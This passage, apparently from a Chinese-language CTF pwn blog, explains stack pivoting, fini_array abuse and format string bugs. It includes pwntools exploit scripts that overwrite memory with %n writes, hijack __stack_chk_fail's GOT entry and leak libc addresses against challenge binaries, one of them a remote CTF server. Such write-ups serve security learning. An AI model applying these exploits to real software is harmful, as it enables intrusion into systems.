class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><p><img src="https://i.loli.net/2021/04/20/IRm7NOvVFflU1YM.jpg" alt="远程通过.jpg"></p> <p>最后得到flag.</p> <p>另一种就是wiki上的构造<code>execve</code>和<code>/bin/sh</code>来写入。<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/" target="_blank" rel="noopener noreferrer">wiki<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h4 id="栈迁移"><a href="#栈迁移" class="header-anchor">#</a> 栈迁移</h4> <p>栈迁移主要是说的leave指令：</p> <div class="language-assembly line-numbers-mode"><pre class="language-text"><code>mov esp,ebp
pop ebp
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><code>ret</code>指令：</p> <div class="language-assembly line-numbers-mode"><pre class="language-text"><code>pop eip
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>第一个指令会改变<code>esp</code>的值，第二个指令会改变<code>ebp</code>的值(<code>ebp</code>的值不是太重要)</li> <li>我们主要想控制的是<code>esp</code>的值，这里就要用到两个<code>gadget(leave ret</code>)第一个gadget用来改变<code>ebp</code>的值，第二个指令用来改变<code>esp</code>的值</li></ul> <p>栈迁移可以把栈迁移在<code>bss</code>段和堆上。然后再去执行<code>rop</code>链.</p> <ul><li>记录了一个没利用过的栈迁移。</li></ul> <p>通过对<code>libc_csu_fini</code> 的利用，由于<code>libc_csu_fini</code> 会调用一个 <code>fini_array</code>数组，而这个数组只有两个元素，而且当数组执行的时候，<code>fini_array[1]</code>比<code>fini_array[0]</code>先利用。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span>
<span class="token function">__libc_csu_init</span> <span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token comment">/* For dynamically linked executables the preinit array is executed by
     the dynamic linker (before initializing any shared object).  */</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">LIBC_NONSHARED</span></span>
  <span class="token comment">/* For static executables, preinit happens right before init.  */</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token class-name">size_t</span> size <span class="token operator">=</span> __preinit_array_end <span class="token operator">-</span> __preinit_array_start<span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>__preinit_array_start <span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">NO_INITFINI</span></span>
  <span class="token function">_init</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

  <span class="token keyword">const</span> <span class="token class-name">size_t</span> size <span class="token operator">=</span> __init_array_end <span class="token operator">-</span> __init_array_start<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
      <span class="token punctuation">(</span><span class="token operator">*</span>__init_array_start <span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/* This function should not be used anymore.  We run the executable's
   destructor now just like any other.  We cannot remove the function,
   though.  */</span>
<span class="token keyword">void</span>
<span class="token function">__libc_csu_fini</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">LIBC_NONSHARED</span></span>
  <span class="token class-name">size_t</span> i <span class="token operator">=</span> __fini_array_end <span class="token operator">-</span> __fini_array_start<span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">--</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">(</span><span class="token operator">*</span>__fini_array_start <span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">ifndef</span> <span class="token expression">NO_INITFINI</span></span>
  <span class="token function">_fini</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br></div></div><p>可以看到，<code>init</code>调用<code>init_array,fini</code> 调用 <code>fini_array</code> 而且<code>init_array</code>是从0开始迭代增长，<code>fini_array</code>从i下标开始向0迭代.</p> <p>而且由于 程序一开始是从 <code>start</code>函数进行</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>STATIC <span class="token keyword">int</span>
<span class="token function">LIBC_START_MAIN</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>main<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span> MAIN_AUXVEC_DECL<span class="token punctuation">)</span><span class="token punctuation">,</span>
         <span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">LIBC_START_MAIN_AUXVEC_ARG</span></span>
         <span class="token function">ElfW</span><span class="token punctuation">(</span><span class="token class-name">auxv_t</span><span class="token punctuation">)</span> <span class="token operator">*</span>auxvec<span class="token punctuation">,</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
         <span class="token function">__typeof</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> init<span class="token punctuation">,</span>
         <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>fini<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
         <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>rtld_fini<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>stack_end<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><img src="https://i.loli.net/2021/04/20/ujrTsEcI5iD9LqH.jpg" alt="start"></p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token function">__libc_start_main</span><span class="token punctuation">(</span> main<span class="token punctuation">,</span> argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> __libc_csu_init<span class="token punctuation">,</span> __libc_csu_fini<span class="token punctuation">,</span> edx<span class="token punctuation">,</span> top of stack<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>执行流程就如<code>_start -&gt; __libc_start_main -&gt; init -&gt; main -&gt; fini</code></p> <p>利用流程大致是这样，进行修改，无限循环main，这样也能方便复写。(想到这样操作的是真的强)</p> <p><img src="https://i.loli.net/2021/04/20/mrVf2zD9ikUqLEc.jpg" alt="yuque_2.jpg"></p> <h2 id="格式化字符串"><a href="#格式化字符串" class="header-anchor">#</a> 格式化字符串</h2> <p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。</p> <p><img src="https://i.loli.net/2021/04/20/wAfH5lxvqW9Ls3I.jpg" alt="undefined"></p> <h4 id="常见的格式化字符串函数"><a href="#常见的格式化字符串函数" class="header-anchor">#</a> 常见的格式化字符串函数</h4> <ul><li><p>输入</p> <ul><li><code>scanf</code></li></ul></li> <li><p>输出</p> <ul><li><code>printf</code></li> <li><code>fprintf</code></li> <li><code>sprintf</code></li></ul></li></ul> <p>更多函数在<code>CTFwiki</code>上有，<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/" target="_blank" rel="noopener noreferrer">wiki<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h4 id="格式化字符串输入格式"><a href="#格式化字符串输入格式" class="header-anchor">#</a> 格式化字符串输入格式</h4> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">%</span><span class="token punctuation">[</span>parameter<span class="token punctuation">]</span><span class="token punctuation">[</span>flags<span class="token punctuation">]</span><span class="token punctuation">[</span>field width<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">.</span>precision<span class="token punctuation">]</span><span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token builtin">type</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>parameter
<ul><li>n$，获取格式化字符串中的指定参数</li></ul></li> <li>flag</li> <li>field width
<ul><li>输出的最小宽度</li></ul></li> <li>precision
<ul><li>输出的最大长度</li></ul></li> <li>length，输出的长度
<ul><li><code>hh</code>，输出一个字节</li> <li><code>h</code>，输出一个双字节</li></ul></li> <li>type
<ul><li><code>d/i</code>，有符号整数</li> <li><code>u</code>，无符号整数</li> <li><code>x/X</code>，16 进制 <code>unsigned int</code> 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li> <li><code>o</code>，8 进制 <code>unsigned int</code>。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li> <li><code>s</code>，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 <code>wchar_t</code> 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 <code>wcrtomb</code>函数。</li> <li><code>c</code>，如果没有用 l 标志，把 <code>int</code>参数转为 unsigned char 型输出；如果用了 l 标志，把<code>wint_t</code> 参数转为包含两个元素的 <code>wchart_t</code> 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li> <li><code>p</code>， void * 型，输出对应变量的值。<code>printf(&quot;%p&quot;,a)</code> 用地址的格式打印变量 a 的值，<code>printf(&quot;%p&quot;, &amp;a)</code> 打印变量 a 所在的地址。</li> <li><code>n</code>，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li> <li><code>%，</code>%`'字面值，不接受任何 flags, width。</li></ul></li></ul> <h4 id="泄露出参数的地址"><a href="#泄露出参数的地址" class="header-anchor">#</a> 泄露出参数的地址</h4> <p>利用</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>aaaa,%s%s%s%s%s%s%s%s%s%s%s%s%s%s
aaaa,%p%p%p%p%p%p%p%p%p%p%p%p%p%p
通过断点断在参数出现的函数地方，参数的打印位置
一般是 x/20xw <span class="token variable">$ebp</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>题目类型</p> <h6 id="jarvis-oj-fm"><a href="#jarvis-oj-fm" class="header-anchor">#</a> jarvis oj -fm</h6> <p>分析-解题</p> <ul><li><p><img src="https://i.loli.net/2021/04/20/CE2n4Rchoks3Ngb.jpg" alt="checksec.jpg"></p> <p>大致知道了程序的保护，当时还以为需要通过格式化字符串漏洞来进行泄露<code>canary</code>来解题。</p></li> <li><p>在进入<code>ida</code>分析程序</p> <p><img src="https://i.loli.net/2021/04/20/FDBgPSGWfC1mA6n.jpg" alt="main.jpg"></p> <p>主要问题就是10行的<code>prntf</code>，而那个<code>be_nice_to_people</code></p> <p><img src="https://i.loli.net/2021/04/20/L72J1PNCi8VroBe.jpg" alt="getgid.jpg"></p> <p>只有这两个函数，通过查阅资料<a href="https://blog.csdn.net/zhuxiaoping54532/article/details/51700576" target="_blank" rel="noopener noreferrer">linux系统调用<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>知道了</p></li></ul> <p><img src="https://i.loli.net/2021/04/20/eVlpGiH6IcRjY2v.jpg" alt="getgid解释.jpg"></p> <p><img src="https://i.loli.net/2021/04/20/JDbuxsyY9GaIcwT.jpg" alt="setresgid.jpg"></p> <p>知道这两个函数主要是保证<code>linux</code>的系统调用成功设置参数。可能还有其他的作用，没有发现，希望发现的师傅可以讲讲。</p> <ul><li><p>解题思路，只需要把<code>x</code>的参数，占栈地址的第几个就能进行打通。当时先试了试6个地址长度，发现找不到，后面试了12个地址长度，找到了</p> <p><img src="https://i.loli.net/2021/04/20/B8Teiw1xPnNy2Ed.jpg" alt="找到x在栈上的实际位置.jpg"></p> <p>可以看出x的在栈上占第11位。</p> <p><img src="https://i.loli.net/2021/04/20/SAcHbXT9yGdEIqm.jpg" alt="x_addr.jpg"></p> <p>而且可以看到，x最后<code>printf</code>出来的是3，我们需要把它改成4.恰好x的地址在32位程序中是四字节的，正好能让参数1为4。</p></li></ul> <p>exp</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">&quot;debug&quot;</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">&quot;i386&quot;</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">&quot;linux&quot;</span><span class="token punctuation">)</span>

<span class="token comment">#io = process(&quot;./fm&quot;)</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;pwn2.jarvisoj.com&quot;</span><span class="token punctuation">,</span><span class="token number">9895</span><span class="token punctuation">)</span>

x_addr <span class="token operator">=</span> <span class="token number">0x0804A02C</span> 
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>x_addr<span class="token punctuation">,</span><span class="token string">'%11$n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(io)</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;cat flag&quot;</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

pause<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>在本地能看到打通</p> <p><img src="https://i.loli.net/2021/04/20/FlStwB6MxEvXf7W.jpg" alt="本地打通.jpg"></p> <h6 id="baby-fmt"><a href="#baby-fmt" class="header-anchor">#</a> baby-fmt</h6> <p>分析-解题</p> <ul><li><p><img src="https://i.loli.net/2021/04/20/TPhAa76VOvUming.jpg" alt="checksec.jpg"></p> <p>看出是64位，开了栈溢出保护，栈不可执行。</p></li> <li><p><code>ida</code>分析</p> <p><img src="https://i.loli.net/2021/04/20/WDq5knbIL8Ma6dC.jpg" alt="main.jpg"></p> <p>看了<code>main</code>函数发现并没有输入不合法这种情况。困扰了很久。后面才知道用题目给的<code>__stack_chk_fail</code>这个函数。利用它在没开始栈溢出之前把它的地址改成我们的<strong>backdoor函数</strong>的地址就可以在栈溢出触发后调用到我们的<strong>backdoor函数</strong>里去。</p> <p><img src="https://i.loli.net/2021/04/20/YucUB9bC6dGADpq.jpg" alt="strings.jpg"><img src="F:%5CHgame%5C2019%5Cpwn%5Clevel2%5Cbabyfmt%5Ctu%5Cbackdoor.jpg" alt="backdoor"></p></li> <li><p>下一个步骤就是寻找format在栈上的参数位置。利用read将其改造写入。</p> <p><img src="https://i.loli.net/2021/04/20/bMFAp3QYer9jmBw.jpg" alt="找到format的栈参数位.jpg"></p> <p>可以看到位置在参数的第6个。</p></li> <li><p>exp</p></li></ul> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">&quot;debug&quot;</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">&quot;amd64&quot;</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">&quot;linux&quot;</span><span class="token punctuation">)</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./babyfmtt&quot;</span><span class="token punctuation">)</span>
<span class="token comment">#io = remote(&quot;118.24.3.214&quot;,11001)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./babyfmtt&quot;</span><span class="token punctuation">)</span>

stack_fail <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">&quot;__stack_chk_fail&quot;</span><span class="token punctuation">]</span>
backdoor <span class="token operator">=</span> <span class="token number">0x40084e</span>

payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>backdoor <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&quot;c%8$hn&quot;</span><span class="token punctuation">,</span><span class="token string">'saob0'</span><span class="token punctuation">,</span>stack_fail<span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span> <span class="token number">0x60</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#由于这里在进行$hn之前加了一个参数，以及后面的函数地址，导致需要八个参数的填充位置。所以是%8$hn，payload的写法参照wiki上的排序类型。</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;It's easy to PWN&quot;</span><span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(io)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


puase<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>调试部分</p> <p><img src="https://i.loli.net/2021/04/20/C7Pve9Wr34O2siu.jpg" alt="传入payload.jpg"></p> <p>读入payload。</p> <p><img src="https://i.loli.net/2021/04/20/Y6r15lEUwmbBeIu.jpg" alt="栈中payload.jpg"></p> <p>栈中的payload。</p> <h6 id="contacts"><a href="#contacts" class="header-anchor">#</a> contacts</h6> <p>分析-解题</p> <ul><li><p><img src="https://i.loli.net/2021/04/20/NsdRqOkFzHQ7afx.jpg" alt="checksec.jpg"></p> <p>32位程序，开了栈溢出保护，栈不可执行。</p></li> <li><p><code>ida</code>分析主要发现了问题函数</p> <p><img src="https://i.loli.net/2021/04/20/bjsli5nQa9cOHSZ.jpg" alt="问题函数.jpg"></p> <p><img src="https://i.loli.net/2021/04/20/nhEwKNliDQqRaTp.jpg" alt="问题所在.jpg"></p> <p>通过运行程序知道这个<code>format</code>是在堆上的。并不像之前的题目都是在栈上的。然后进行<code>gdb</code>调试看看参数位置。</p> <p><img src="https://i.loli.net/2021/04/20/DMSYIEWQF6kA38C.jpg" alt="ebp-main-format.jpg"></p> <p><strong>从这个地方可以看出<code>ebp</code>在位于07行，偏移为7，而输入的description，位于0xc，偏移12，而<code>__libc_start_main</code>,位于0x20。偏移为32。</strong></p> <p><img src="https://i.loli.net/2021/04/20/pEHzDsedvBP9fyR.jpg" alt="字符串到ebp的位置.jpg"></p> <p>我们又能看到字符串与<code>epb</code>的位置相差0x14。</p></li> <li><p>主要思路还是先通过运行一次程序把<code>libc_start_main</code>的地址泄露出来，然后利用<code>libc</code>来找到<code>system函数和‘/bin/sh’字符串</code>。然后再进行一次泄露把<code>ebp</code>和<code>heap</code>的地址泄露出来。再修改<code>heap</code>地址为<code>system</code>，最后实现</p></li></ul> <p>exp</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">&quot;debug&quot;</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">&quot;i386&quot;</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">&quot;linux&quot;</span><span class="token punctuation">)</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./contacts&quot;</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./contacts&quot;</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">func_1</span><span class="token punctuation">(</span>io<span class="token punctuation">,</span>name<span class="token punctuation">,</span>phone<span class="token punctuation">,</span>len_des<span class="token punctuation">,</span>description<span class="token punctuation">)</span><span class="token punctuation">:</span>
	r <span class="token operator">=</span> io
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'&gt;&gt;&gt; '</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Contact info: \n'</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name: '</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'You have 10 numbers\n'</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>phone<span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Length of description: '</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>len_des<span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'description:\n\t\t'</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>description<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">func_4</span><span class="token punctuation">(</span>io<span class="token punctuation">)</span><span class="token punctuation">:</span>
	r <span class="token operator">=</span> io
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;&gt;&gt;&gt;&quot;</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;4&quot;</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;Description: &quot;</span><span class="token punctuation">)</span>

<span class="token comment">#gdb.attach(io)</span>
